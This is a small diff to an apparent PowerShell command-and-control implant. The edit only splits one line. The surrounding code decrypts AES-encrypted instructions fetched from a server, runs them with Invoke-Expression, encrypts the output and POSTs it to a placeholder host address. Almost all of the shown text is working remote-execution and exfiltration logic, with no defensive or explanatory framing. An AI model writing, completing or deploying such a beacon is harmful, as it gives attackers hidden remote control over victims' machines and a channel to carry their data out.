@@ -8,6 +8,7 @@ $CipherText = [Convert]::FromBase64String($Response.Content);
 $PlainText = $Decryptor.TransformFinalBlock($CipherText, 0, $CipherText.Length);
 $Decrypted = [System.Text.Encoding]::UTF8.GetString($PlainText);
 $Exe = iex $Decrypted;$PlainText = [System.Text.Encoding]::UTF8.GetBytes($Exe);
-$Encryptor = $AES.CreateEncryptor();$CipherText = $Encryptor.TransformFinalBlock($PlainText, 0, $PlainText.Length);$Encoded = [Convert]::ToBase64String($CipherText);
+$Encryptor = $AES.CreateEncryptor();
+$CipherText = $Encryptor.TransformFinalBlock($PlainText, 0, $PlainText.Length);$Encoded = [Convert]::ToBase64String($CipherText);
 Invoke-WebRequest -Uri "http://0.0.0.0:0" -Method POST -Body $Encoded
 }
